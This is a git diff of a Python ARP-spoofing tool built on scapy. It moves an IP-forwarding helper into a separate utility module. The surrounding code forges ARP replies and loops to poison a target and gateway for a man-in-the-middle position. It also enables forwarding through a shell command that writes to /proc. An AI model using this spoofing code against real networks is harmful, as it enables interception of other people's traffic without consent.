@@ -17,6 +17,7 @@ import time
 import sys
 import subprocess
 from subprocess import Popen
+from utils.enable_port_fwd import enable_port_fwd
 
 class Spoofer:
     def resolve_mac_from_ip(self, ip_address):
@@ -50,18 +51,8 @@ class Spoofer:
         arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
         scapy.send(arp_packet, count=4, verbose=False)
 
-    def enable_port_fwd(self):
-        """
-        Enables port forwarding through controller machine.
-        """
-        print("[+] Enabling port forwarding.")
-        ip_fwd_cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
-        # test_cmd = "echo 1 >> hello.txt"
-        proc = subprocess.Popen(ip_fwd_cmd, shell=True, stdout=subprocess.PIPE)
-        print(proc.communicate()[0]),
-
     def run(self, target_ip, gateway_ip):
-        self.enable_port_fwd()
+        enable_port_fwd()
         sent_packets_count = 0
         while True:
             self.spoof(target_ip, gateway_ip) # client, I am the router
